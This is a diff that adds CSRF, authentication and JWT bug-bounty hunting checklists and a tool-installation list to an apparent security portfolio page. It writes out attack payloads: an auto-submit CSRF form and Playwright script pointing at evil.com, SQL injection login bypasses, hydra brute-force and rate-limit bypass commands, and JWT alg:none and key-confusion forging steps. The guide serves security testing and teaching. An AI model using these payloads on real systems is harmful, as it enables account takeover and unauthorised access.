@@ -341,6 +341,11 @@
                 <li><a href="#about">About</a></li>
                 <li><a href="#services">Services</a></li>
                 <li><a href="#skills">Skills</a></li>
+                <li><a href="#auth-guide">Auth Guide</a></li>
+                <li><a href="#jwt-guide">JWT Guide</a></li>
+                <li><a href="#csrf-guide">CSRF Guide</a></li>
+                <li><a href="#tools-installation">Tools</a></li>
+                <li><a href="#xss-guide">XSS Guide</a></li>
                 <li><a href="#ssrf-guide">SSRF Guide</a></li>
                 <li><a href="#sqli-checklist">SQLi Guide</a></li>
                 <li><a href="#resources">Resources</a></li>
@@ -466,6 +471,922 @@
                         <h3>Reporting</h3>
                         <p>Technical Documentation & Analysis</p>
                     </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="csrf-guide">
+            <div class="container">
+                <h2 class="section-title">🛡️ CSRF Vulnerability Hunting Checklist</h2>
+                <div class="terminal">
+                    <div class="terminal-content">
+                        <div>root@cybersec:~$ cat csrf_hunt.sh</div>
+                        <div>#!/bin/bash</div>
+                        <div>gau $1 | grep -Ei 'delete|update|change|reset|settings'</div>
+                        <div>burp --target $1 --proxy --intercept</div>
+                        <div>playwright install</div>
+                        <div class="typing">CSRF hunting toolkit ready...</div>
+                    </div>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <h3>🔍 1. Identify CSRF-Prone Endpoints</h3>
+                        <p><strong>High-Value Targets:</strong></p>
+                        <ul>
+                            <li><strong>Account Settings:</strong> /change_email, /update_profile</li>
+                            <li><strong>Password Management:</strong> /reset_password, /change_password</li>
+                            <li><strong>User Management:</strong> /admin/delete_user, /admin/add_user</li>
+                            <li><strong>Financial Actions:</strong> /wallet/transfer, /payment/send</li>
+                        </ul>
+                        <p><strong>Discovery Commands:</strong></p>
+                        <ul>
+                            <li><code>gau target.com | grep -Ei 'delete|update|change|admin'</code></li>
+                            <li>Use Burp Spider to crawl forms and actions</li>
+                            <li>Filter for POST/PUT/DELETE methods in Burp</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🛡️ 2. Check CSRF Protections</h3>
+                        <p><strong>Protection Mechanisms:</strong></p>
+                        <ul>
+                            <li><strong>CSRF Tokens:</strong> Look for csrf_token in request body/headers</li>
+                            <li><strong>SameSite Cookies:</strong> Check for SameSite=Strict/Lax</li>
+                            <li><strong>Origin/Referer:</strong> Header validation checks</li>
+                        </ul>
+                        <p><strong>Testing Commands:</strong></p>
+                        <ul>
+                            <li><code>curl -I https://target.com/login | grep -i set-cookie</code></li>
+                            <li>Remove CSRF token and resend in Burp Repeater</li>
+                            <li>Test without Origin/Referer headers</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>⚔️ 3. Craft CSRF Exploit PoC</h3>
+                        <p><strong>Auto-Submit Form:</strong></p>
+                        <ul>
+                            <li><code>&lt;form action="target.com/change_email" method="POST"&gt;</code></li>
+                            <li><code>&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;</code></li>
+                            <li><code>document.getElementById("csrfForm").submit();</code></li>
+                        </ul>
+                        <p><strong>GET-based CSRF:</strong></p>
+                        <ul>
+                            <li><code>&lt;img src="https://target.com/delete?id=123"&gt;</code></li>
+                            <li>Works with SameSite=Lax cookies</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🧠 4. Bypass SameSite/Origin Checks</h3>
+                        <p><strong>SameSite Bypass Techniques:</strong></p>
+                        <ul>
+                            <li><strong>GET Requests:</strong> &lt;img&gt; tags work with Lax</li>
+                            <li><strong>Top-level Navigation:</strong> Direct window.open() calls</li>
+                            <li><strong>Open Redirect Chain:</strong> Combine with redirect vulnerabilities</li>
+                        </ul>
+                        <p><strong>Origin Header Bypass:</strong></p>
+                        <ul>
+                            <li>Use &lt;img&gt; or &lt;a&gt; tags (don't send Origin)</li>
+                            <li>Test referrerpolicy="no-referrer"</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔗 5. CORS + Cookie Misconfig Chain</h3>
+                        <p><strong>Check for CORS Issues:</strong></p>
+                        <ul>
+                            <li><code>curl -H "Origin: https://attacker.com" target.com/api</code></li>
+                            <li>Look for: Access-Control-Allow-Credentials: true</li>
+                            <li>Wildcard CORS: Access-Control-Allow-Origin: *</li>
+                        </ul>
+                        <p><strong>Cookie Misconfigurations:</strong></p>
+                        <ul>
+                            <li>Missing SameSite attribute</li>
+                            <li>SameSite=None without Secure flag</li>
+                            <li>Cross-origin cookie sharing</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>⚙️ 6. Automate with Playwright</h3>
+                        <p><strong>Installation:</strong></p>
+                        <ul>
+                            <li><code>pip install playwright</code></li>
+                            <li><code>playwright install</code></li>
+                        </ul>
+                        <p><strong>Automation Benefits:</strong></p>
+                        <ul>
+                            <li>Simulate real victim login flow</li>
+                            <li>Auto-open CSRF payload pages</li>
+                            <li>Verify successful exploitation</li>
+                            <li>Generate screenshots for evidence</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top: 2rem;">
+                    <div class="terminal-content">
+                        <div style="color: #ff5555;">🧪 Playwright CSRF Automation Example:</div>
+                        <div>from playwright.sync_api import sync_playwright</div>
+                        <div>page.goto("https://victim.com/login")</div>
+                        <div>page.fill("input[name='username']", "victim_user")</div>
+                        <div>page.goto("https://evil.com/csrf.html")</div>
+                        <div>page.screenshot(path="csrf_success.png")</div>
+                        <div style="color: #00ff88;">if "attacker@evil.com" in email: print("[+] CSRF Success!")</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top: 2rem; background: rgba(255, 215, 0, 0.1); border-left: 4px solid #ffd700;">
+                    <h3>🧪 Quick Verification Checklist</h3>
+                    <ul>
+                        <li>✅ Login as victim user</li>
+                        <li>✅ Trigger CSRF payload</li>
+                        <li>✅ Check if data changed on server</li>
+                        <li>✅ Verify cookies are valid</li>
+                        <li>✅ Take screenshots for evidence</li>
+                        <li>✅ Test in multiple browsers</li>
+                        <li>✅ Document network requests</li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(0, 153, 255, 0.1); border-left: 4px solid #0099ff;">
+                    <h3>💰 Real-World CSRF Bug Bounty Examples</h3>
+                    <ul>
+                        <li><strong>GitHub (2019):</strong> Email change CSRF - Missing token validation</li>
+                        <li><strong>PayPal:</strong> Profile update CSRF - SameSite=None bypass</li>
+                        <li><strong>Shopify:</strong> Collaborator invite CSRF + CORS chain - $8,000</li>
+                        <li><strong>Google (Gmail):</strong> Auto-forward rule CSRF</li>
+                        <li><strong>Twitter (2018):</strong> Block/mute user via &lt;img&gt; tag</li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(255, 85, 85, 0.1); border-left: 4px solid #ff5555;">
+                    <h3>📋 Professional Report Format</h3>
+                    <p><strong>Report Structure:</strong></p>
+                    <ul>
+                        <li><strong>Title:</strong> "CSRF leads to Email Change via SameSite Bypass"</li>
+                        <li><strong>Impact:</strong> Account takeover, notification redirection</li>
+                        <li><strong>PoC:</strong> HTML payload + step-by-step reproduction</li>
+                        <li><strong>Evidence:</strong> Screenshots, Burp requests, Playwright script</li>
+                    </ul>
+                    <p><strong>Bounty Ranges:</strong></p>
+                    <ul>
+                        <li>CSRF + User Data Change: $500 - $3,000</li>
+                        <li>CSRF + Email/Password: $3,000 - $10,000</li>
+                        <li>CORS + Token Extraction: $5,000 - $15,000</li>
+                        <li>Complete Account Takeover: $8,000 - $20,000</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="auth-guide">
+            <div class="container">
+                <h2 class="section-title">🔐 Ultimate Authentication Vulnerability Checklist</h2>
+                <div class="terminal">
+                    <div class="terminal-content">
+                        <div>root@cybersec:~$ cat auth_hunt.sh</div>
+                        <div>#!/bin/bash</div>
+                        <div>gau $1 | grep -Ei '(login|signup|auth|admin|reset)'</div>
+                        <div>ffuf -w wordlists/auth.txt -u https://$1/FUZZ -fc 404</div>
+                        <div>hydra -L users.txt -P passwords.txt $1 http-post-form</div>
+                        <div class="typing">Authentication testing arsenal ready...</div>
+                    </div>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <h3>🔐 1. Information Gathering</h3>
+                        <p><strong>Common Auth Endpoints:</strong></p>
+                        <ul>
+                            <li>/login, /signin, /auth, /admin, /signup</li>
+                            <li>/api/login, /api/auth, /.well-known/</li>
+                            <li>/reset, /password-reset, /user, /account</li>
+                        </ul>
+                        <p><strong>Discovery Commands:</strong></p>
+                        <ul>
+                            <li><code>gau example.com | grep -Ei '(login|auth|reset)'</code></li>
+                            <li><code>katana -u https://example.com -jc | grep ".js"</code></li>
+                            <li><code>ffuf -w wordlists/auth.txt -u https://example.com/FUZZ</code></li>
+                        </ul>
+                        <p><strong>JS File Analysis:</strong></p>
+                        <ul>
+                            <li>Search for: authToken, client_secret, redirect_uri</li>
+                            <li>Look for: setToken(), getToken(), isLoggedIn()</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🚫 2. Weak Credentials & Brute Force</h3>
+                        <p><strong>Common Default Creds:</strong></p>
+                        <ul>
+                            <li>admin:admin, admin:password, root:root</li>
+                            <li>user:user, test:test123, guest:guest</li>
+                        </ul>
+                        <p><strong>Brute Force Tools:</strong></p>
+                        <ul>
+                            <li><code>hydra -L users.txt -P passwords.txt target.com http-post-form</code></li>
+                            <li><code>ffuf -w users.txt:FUZZ -X POST -d "username=FUZZ&password=123"</code></li>
+                        </ul>
+                        <p><strong>Rate Limit Bypass:</strong></p>
+                        <ul>
+                            <li>Rotate X-Forwarded-For, User-Agent headers</li>
+                            <li>Use multiple proxies via proxychains</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🚫 3. Authentication Bypass</h3>
+                        <p><strong>SQL Injection Payloads:</strong></p>
+                        <ul>
+                            <li><code>' OR 1=1--</code></li>
+                            <li><code>admin' --</code></li>
+                            <li><code>' UNION SELECT 1,2,3--</code></li>
+                        </ul>
+                        <p><strong>Logic Manipulation:</strong></p>
+                        <ul>
+                            <li>role=user → role=admin</li>
+                            <li>isAdmin=false → isAdmin=true</li>
+                            <li>group_id=2 → group_id=1</li>
+                        </ul>
+                        <p><strong>JWT Token Bypass:</strong></p>
+                        <ul>
+                            <li>Change alg to "none"</li>
+                            <li>Modify payload claims</li>
+                            <li><code>python3 jwt_tool.py &lt;token&gt; -X alg=none</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔑 4. Token & Session Testing</h3>
+                        <p><strong>Session Mechanisms:</strong></p>
+                        <ul>
+                            <li>Cookies: sessionid, auth, token, jwt</li>
+                            <li>Headers: Authorization: Bearer &lt;JWT&gt;</li>
+                            <li>Storage: localStorage, sessionStorage</li>
+                        </ul>
+                        <p><strong>Security Checks:</strong></p>
+                        <ul>
+                            <li>HttpOnly, Secure, SameSite flags</li>
+                            <li>Session fixation testing</li>
+                            <li>Token replay after logout</li>
+                        </ul>
+                        <p><strong>JWT Analysis:</strong></p>
+                        <ul>
+                            <li><code>python3 jwt_tool.py &lt;token&gt; -d</code></li>
+                            <li>Test alg:none, claim tampering</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔁 5. Multi-Factor Authentication Bypass</h3>
+                        <p><strong>2FA Types to Test:</strong></p>
+                        <ul>
+                            <li>TOTP (Time-based codes), Email OTP, SMS OTP</li>
+                            <li>Backup codes, Push-based approval</li>
+                        </ul>
+                        <p><strong>Bypass Techniques:</strong></p>
+                        <ul>
+                            <li>Skip 2FA step - direct dashboard access</li>
+                            <li>Brute force 6-digit codes (000000-999999)</li>
+                            <li>Reuse valid OTP for different sessions</li>
+                        </ul>
+                        <p><strong>Rate Limit Testing:</strong></p>
+                        <ul>
+                            <li>Use Burp Intruder for OTP brute force</li>
+                            <li>Check for timing side-channels</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔐 6. OAuth/SSO Vulnerabilities</h3>
+                        <p><strong>OAuth Flow Testing:</strong></p>
+                        <ul>
+                            <li>Open redirect in redirect_uri parameter</li>
+                            <li>Missing state parameter (CSRF)</li>
+                            <li>Authorization code reuse</li>
+                        </ul>
+                        <p><strong>Token Manipulation:</strong></p>
+                        <ul>
+                            <li>JWT/ID token forgery</li>
+                            <li>Scope escalation attacks</li>
+                            <li>Social login account linking flaws</li>
+                        </ul>
+                        <p><strong>Testing Commands:</strong></p>
+                        <ul>
+                            <li>Test: redirect_uri=https://evil.com</li>
+                            <li>Remove state parameter from auth URL</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🕸️ 7. Password Reset Vulnerabilities</h3>
+                        <p><strong>Common Issues:</strong></p>
+                        <ul>
+                            <li>Email enumeration via different responses</li>
+                            <li>Reusable or non-expiring reset tokens</li>
+                            <li>Predictable token generation</li>
+                        </ul>
+                        <p><strong>IDOR Testing:</strong></p>
+                        <ul>
+                            <li>Change uid parameter in reset links</li>
+                            <li>Test token replay across different users</li>
+                        </ul>
+                        <p><strong>Token Analysis:</strong></p>
+                        <ul>
+                            <li>Check token format and length</li>
+                            <li>Test for base64 decoded user data</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🧬 8. Advanced Logic Testing</h3>
+                        <p><strong>Session Management:</strong></p>
+                        <ul>
+                            <li>Session fixation attacks</li>
+                            <li>JWT algorithm confusion (RS256→HS256)</li>
+                            <li>No session timeout enforcement</li>
+                        </ul>
+                        <p><strong>Cookie Security:</strong></p>
+                        <ul>
+                            <li>Missing HttpOnly, Secure, SameSite flags</li>
+                            <li>Session tokens in URL parameters</li>
+                            <li>Weak or predictable session IDs</li>
+                        </ul>
+                        <p><strong>Logout Testing:</strong></p>
+                        <ul>
+                            <li>Session persistence after logout</li>
+                            <li>Token reuse from browser history</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top: 2rem;">
+                    <div class="terminal-content">
+                        <div style="color: #ff5555;">🧰 Essential Auth Testing Tools:</div>
+                        <div># Brute force tools</div>
+                        <div>hydra -L users.txt -P passwords.txt target.com http-post-form</div>
+                        <div># JWT testing</div>
+                        <div>python3 jwt_tool.py &lt;token&gt; -X alg=none -S secret</div>
+                        <div># Session testing</div>
+                        <div>curl -b "session=abc123" https://target.com/profile</div>
+                        <div># OAuth testing</div>
+                        <div>curl "https://oauth.com/auth?redirect_uri=https://evil.com"</div>
+                        <div style="color: #00ff88;">Complete auth vulnerability assessment ready! 🎯</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top: 2rem; background: rgba(255, 215, 0, 0.1); border-left: 4px solid #ffd700;">
+                    <h3>📝 Professional Report Templates</h3>
+                    <p><strong>Report Structure:</strong></p>
+                    <ul>
+                        <li><strong>Title:</strong> "Authentication Bypass via [Vuln Type] on [Endpoint]"</li>
+                        <li><strong>Summary:</strong> Brief description of the flaw and impact</li>
+                        <li><strong>Steps:</strong> Clear reproduction steps with commands</li>
+                        <li><strong>PoC:</strong> Burp requests, screenshots, curl commands</li>
+                        <li><strong>Impact:</strong> Account takeover, privilege escalation</li>
+                        <li><strong>Fix:</strong> Specific remediation recommendations</li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(255, 85, 85, 0.1); border-left: 4px solid #ff5555;">
+                    <h3>💰 Real Bug Bounty Examples</h3>
+                    <ul>
+                        <li><strong>JWT alg:none Bypass:</strong> $1,500 - $4,200 (Critical auth bypass)</li>
+                        <li><strong>OAuth Redirect Bypass:</strong> $2,000 - $8,000 (Account takeover)</li>
+                        <li><strong>2FA Brute Force:</strong> $3,000 - $10,000 (No rate limiting)</li>
+                        <li><strong>Session Fixation:</strong> $1,500 - $5,000 (Session hijacking)</li>
+                        <li><strong>Password Reset IDOR:</strong> $2,500 - $7,500 (Mass account takeover)</li>
+                        <li><strong>SQL Injection in Login:</strong> $5,000 - $15,000 (Database access)</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="jwt-guide">
+            <div class="container">
+                <h2 class="section-title">🔐 JWT Vulnerability Hunting Master Guide</h2>
+                <div class="terminal">
+                    <div class="terminal-content">
+                        <div>root@cybersec:~$ cat jwt_hunt.sh</div>
+                        <div>#!/bin/bash</div>
+                        <div>gau $1 | grep -iE 'token|auth|jwt|bearer'</div>
+                        <div>python3 jwt_tool.py $JWT -I -C -d -S</div>
+                        <div>jwt-cracker -t $JWT -w rockyou.txt</div>
+                        <div class="typing">JWT exploitation toolkit loaded...</div>
+                    </div>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <h3>🧭 1. JWT Recon & Discovery</h3>
+                        <p><strong>Where to Find JWTs:</strong></p>
+                        <ul>
+                            <li><strong>Headers:</strong> Authorization: Bearer &lt;JWT&gt;</li>
+                            <li><strong>Cookies:</strong> auth_token=&lt;JWT&gt;</li>
+                            <li><strong>Storage:</strong> localStorage.getItem("token")</li>
+                            <li><strong>URLs:</strong> /verify?token=&lt;JWT&gt;</li>
+                            <li><strong>JS Files:</strong> Hardcoded tokens or API usage</li>
+                        </ul>
+                        <p><strong>Discovery Commands:</strong></p>
+                        <ul>
+                            <li><code>gau target.com | grep -iE 'token|auth|jwt'</code></li>
+                            <li><code>echo "eyJhbGci..." | cut -d "." -f2 | base64 -d</code></li>
+                            <li>Search for "eyJ" prefix (JWT header base64)</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🧪 2. Manual Testing Techniques</h3>
+                        <p><strong>Algorithm None Bypass:</strong></p>
+                        <ul>
+                            <li>Change header: <code>{"alg": "none", "typ": "JWT"}</code></li>
+                            <li>Remove signature part (everything after second dot)</li>
+                            <li><code>python3 jwt_tool.py &lt;jwt&gt; -X alg=none</code></li>
+                        </ul>
+                        <p><strong>Key Confusion (RS256 → HS256):</strong></p>
+                        <ul>
+                            <li>Change alg from RS256 to HS256</li>
+                            <li>Sign with public key as HMAC secret</li>
+                            <li><code>python3 jwt_tool.py &lt;jwt&gt; -S public.pem -X alg=HS256</code></li>
+                        </ul>
+                        <p><strong>Weak Secret Brute Force:</strong></p>
+                        <ul>
+                            <li><code>jwt-cracker -t &lt;jwt&gt; -w rockyou.txt</code></li>
+                            <li>Common secrets: admin, secret, password, 123456</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🛠 3. JWT Automation Tools</h3>
+                        <p><strong>jwt_tool.py (Essential):</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/ticarpi/jwt_tool</code></li>
+                            <li>Inspect: <code>python3 jwt_tool.py &lt;token&gt; -I</code></li>
+                            <li>Crack: <code>python3 jwt_tool.py &lt;token&gt; -C -d -W rockyou.txt</code></li>
+                            <li>Forge: <code>python3 jwt_tool.py &lt;token&gt; -S secret</code></li>
+                        </ul>
+                        <p><strong>Other Tools:</strong></p>
+                        <ul>
+                            <li><code>npm install -g jwt-cracker</code></li>
+                            <li><code>pip install pyjwt</code></li>
+                            <li>Burp Extensions: JWT Editor, Authorizer</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔓 4. Common Vulnerable Scenarios</h3>
+                        <p><strong>Claim Tampering:</strong></p>
+                        <ul>
+                            <li>Modify: <code>{"role": "admin"}</code></li>
+                            <li>Change: <code>{"isAdmin": true}</code></li>
+                            <li>Escalate: <code>{"user_id": 1}</code></li>
+                        </ul>
+                        <p><strong>Time-based Bypasses:</strong></p>
+                        <ul>
+                            <li>Extend expiry: <code>{"exp": 9999999999}</code></li>
+                            <li>Remove exp claim entirely</li>
+                            <li>Manipulate iat, nbf values</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔥 5. Advanced Payload Tricks</h3>
+                        <p><strong>JSON Injection:</strong></p>
+                        <ul>
+                            <li><code>{"user":"admin\r\nrole:admin"}</code></li>
+                            <li>Duplicate claims: <code>{"role": "user", "role": "admin"}</code></li>
+                        </ul>
+                        <p><strong>Scope Escalation:</strong></p>
+                        <ul>
+                            <li><code>{"scope": "read write admin"}</code></li>
+                            <li>OAuth-style privilege escalation</li>
+                        </ul>
+                        <p><strong>Null/Missing Claims:</strong></p>
+                        <ul>
+                            <li><code>{"role": null}</code></li>
+                            <li>Remove critical validation claims</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🛡️ 6. Burp Suite Integration</h3>
+                        <p><strong>Essential Extensions:</strong></p>
+                        <ul>
+                            <li><strong>JWT Editor:</strong> Decode/modify/re-sign tokens</li>
+                            <li><strong>Authorizer:</strong> Test access control automatically</li>
+                            <li><strong>Auth Analyzer:</strong> Detect token weaknesses</li>
+                        </ul>
+                        <p><strong>Manual Testing:</strong></p>
+                        <ul>
+                            <li>Intercept JWT in requests</li>
+                            <li>Send to JWT Editor for modification</li>
+                            <li>Test different algorithms and claims</li>
+                            <li>Use Repeater for payload iteration</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top: 2rem;">
+                    <div class="terminal-content">
+                        <div style="color: #ff5555;">🔥 JWT Tool Installation & Setup:</div>
+                        <div># Install jwt_tool (Essential)</div>
+                        <div>git clone https://github.com/ticarpi/jwt_tool</div>
+                        <div>cd jwt_tool && pip3 install -r requirements.txt</div>
+                        <div># Install jwt-cracker</div>
+                        <div>npm install -g jwt-cracker</div>
+                        <div># Python JWT library</div>
+                        <div>pip install pyjwt cryptography</div>
+                        <div style="color: #00ff88;">echo "JWT toolkit ready for exploitation! 🎯"</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top: 2rem; background: rgba(255, 215, 0, 0.1); border-left: 4px solid #ffd700;">
+                    <h3>💰 Real Bug Bounty Examples</h3>
+                    <ul>
+                        <li><strong>HackerOne:</strong> JWT alg:none bypass - $1,500</li>
+                        <li><strong>Coinbase:</strong> RS256→HS256 key confusion - $7,500</li>
+                        <li><strong>Fintech App:</strong> HMAC secret crack - $4,500</li>
+                        <li><strong>SaaS Platform:</strong> Role claim tampering - $3,500</li>
+                        <li><strong>Banking API:</strong> Key confusion attack - $7,500</li>
+                        <li><strong>Government Portal:</strong> Weak secret (123456) - $2,000</li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(0, 153, 255, 0.1); border-left: 4px solid #0099ff;">
+                    <h3>🧪 JWT Testing Workflow</h3>
+                    <ol>
+                        <li><strong>Discovery:</strong> Find JWT tokens in headers, cookies, storage</li>
+                        <li><strong>Analysis:</strong> Decode and inspect algorithm, claims</li>
+                        <li><strong>Algorithm Testing:</strong> Try alg:none, key confusion</li>
+                        <li><strong>Secret Cracking:</strong> Brute force HMAC secrets</li>
+                        <li><strong>Claim Tampering:</strong> Modify role, user_id, admin</li>
+                        <li><strong>Time Bypass:</strong> Extend expiration, remove exp</li>
+                        <li><strong>Verification:</strong> Test forged tokens for access</li>
+                        <li><strong>Documentation:</strong> Create PoC with evidence</li>
+                    </ol>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(255, 85, 85, 0.1); border-left: 4px solid #ff5555;">
+                    <h3>📝 Professional Report Template</h3>
+                    <p><strong>Report Structure:</strong></p>
+                    <ul>
+                        <li><strong>Title:</strong> "JWT Algorithm Bypass leads to Admin Access"</li>
+                        <li><strong>Asset:</strong> API endpoint with JWT authentication</li>
+                        <li><strong>Vulnerability:</strong> Specific JWT flaw (alg:none, key confusion)</li>
+                        <li><strong>Impact:</strong> Privilege escalation, account takeover</li>
+                        <li><strong>PoC:</strong> Step-by-step reproduction with tools</li>
+                        <li><strong>Evidence:</strong> Screenshots, Burp requests, decoded tokens</li>
+                    </ul>
+                    <p><strong>Severity Ranges:</strong></p>
+                    <ul>
+                        <li>JWT Bypass + Data Access: $1,000 - $3,000</li>
+                        <li>Admin Privilege Escalation: $3,000 - $8,000</li>
+                        <li>Complete Account Takeover: $5,000 - $15,000</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="tools-installation">
+            <div class="container">
+                <h2 class="section-title">🛠️ Essential Tools Installation</h2>
+                <div class="cards-grid">
+                    <div class="card">
+                        <h3>🔍 Reconnaissance Tools</h3>
+                        <p><strong>Subdomain Enumeration:</strong></p>
+                        <ul>
+                            <li><code>go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</code></li>
+                            <li><code>go install github.com/tomnomnom/assetfinder@latest</code></li>
+                            <li><code>go install -v github.com/OWASP/Amass/v3/...@master</code></li>
+                        </ul>
+                        <p><strong>URL Discovery:</strong></p>
+                        <ul>
+                            <li><code>go install github.com/lc/gau@latest</code></li>
+                            <li><code>go install github.com/tomnomnom/waybackurls@latest</code></li>
+                            <li><code>go install github.com/projectdiscovery/katana/cmd/katana@latest</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🧪 Vulnerability Scanners</h3>
+                        <p><strong>SQL Injection:</strong></p>
+                        <ul>
+                            <li><code>apt install sqlmap</code> or <code>pip install sqlmap</code></li>
+                            <li><code>go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest</code></li>
+                        </ul>
+                        <p><strong>XSS Testing:</strong></p>
+                        <ul>
+                            <li><code>go install github.com/hahwul/dalfox/v2@latest</code></li>
+                            <li><code>git clone https://github.com/s0md3v/XSStrike</code></li>
+                        </ul>
+                        <p><strong>SSRF Testing:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/swisskyrepo/SSRFmap</code></li>
+                            <li><code>go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔐 Authentication Testing Tools</h3>
+                        <p><strong>Brute Force & Credential Testing:</strong></p>
+                        <ul>
+                            <li><code>apt install hydra</code> - Network logon cracker</li>
+                            <li><code>git clone https://github.com/vanhauser-thc/thc-hydra</code></li>
+                            <li><code>pip install patator</code> - Multi-purpose brute-forcer</li>
+                        </ul>
+                        <p><strong>Session & Cookie Analysis:</strong></p>
+                        <ul>
+                            <li><code>pip install flask-unsign</code> - Flask session cookie decoder</li>
+                            <li><code>git clone https://github.com/AresS31/swaggerhole</code></li>
+                        </ul>
+                        <p><strong>OAuth & SSO Testing:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/dxa4481/truffleHog</code> - Search for secrets</li>
+                            <li><code>npm install -g oauth-pwn</code> - OAuth vulnerability scanner</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔐 JWT Specific Tools</h3>
+                        <p><strong>JWT Analysis & Exploitation:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/ticarpi/jwt_tool</code></li>
+                            <li><code>cd jwt_tool && pip3 install -r requirements.txt</code></li>
+                            <li><code>npm install -g jwt-cracker</code></li>
+                            <li><code>pip install pyjwt cryptography</code></li>
+                        </ul>
+                        <p><strong>JWT Browser Tools:</strong></p>
+                        <ul>
+                            <li>JWT.io - Online decoder/encoder</li>
+                            <li>JWT Inspector (Chrome Extension)</li>
+                            <li>Burp Suite JWT Editor Extension</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔧 Utility Tools</h3>
+                        <p><strong>Parameter Discovery:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/devanshbatham/paramspider</code></li>
+                            <li><code>git clone https://github.com/s0md3v/Arjun</code></li>
+                        </ul>
+                        <p><strong>HTTP Utilities:</strong></p>
+                        <ul>
+                            <li><code>go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest</code></li>
+                            <li><code>go install github.com/tomnomnom/qsreplace@latest</code></li>
+                            <li><code>go install github.com/ffuf/ffuf@latest</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🎭 Automation & Browsers</h3>
+                        <p><strong>Playwright (Browser Automation):</strong></p>
+                        <ul>
+                            <li><code>pip install playwright</code></li>
+                            <li><code>playwright install chromium firefox webkit</code></li>
+                        </ul>
+                        <p><strong>Pattern Matching:</strong></p>
+                        <ul>
+                            <li><code>go install github.com/tomnomnom/gf@latest</code></li>
+                            <li><code>git clone https://github.com/1ndianl33t/Gf-Patterns</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🔐 Manual Testing Tools</h3>
+                        <p><strong>Burp Suite:</strong></p>
+                        <ul>
+                            <li>Download from: <a href="https://portswigger.net/burp/communitydownload" target="_blank" style="color: #00ff88;">PortSwigger Website</a></li>
+                            <li><strong>Essential Extensions:</strong> Logger++, Param Miner, DOM Invader, JWT Editor</li>
+                        </ul>
+                        <p><strong>Other Tools:</strong></p>
+                        <ul>
+                            <li><code>apt install curl wget nmap</code></li>
+                            <li><code>pip install requests beautifulsoup4</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>📱 Specialized Tools</h3>
+                        <p><strong>JavaScript Analysis:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/GerbenJavado/LinkFinder</code></li>
+                            <li><code>git clone https://github.com/KathanP19/JSFScan</code></li>
+                        </ul>
+                        <p><strong>API Testing:</strong></p>
+                        <ul>
+                            <li><code>git clone https://github.com/assetnote/kiterunner</code></li>
+                            <li><code>go install github.com/projectdiscovery/proxify/cmd/proxify@latest</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top: 2rem;">
+                    <div class="terminal-content">
+                        <div style="color: #00ff88;">🚀 Complete Bug Bounty Setup Script:</div>
+                        <div>#!/bin/bash</div>
+                        <div># Go tools installation</div>
+                        <div>go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</div>
+                        <div>go install github.com/lc/gau@latest</div>
+                        <div>go install github.com/hahwul/dalfox/v2@latest</div>
+                        <div>go install github.com/projectdiscovery/httpx/cmd/httpx@latest</div>
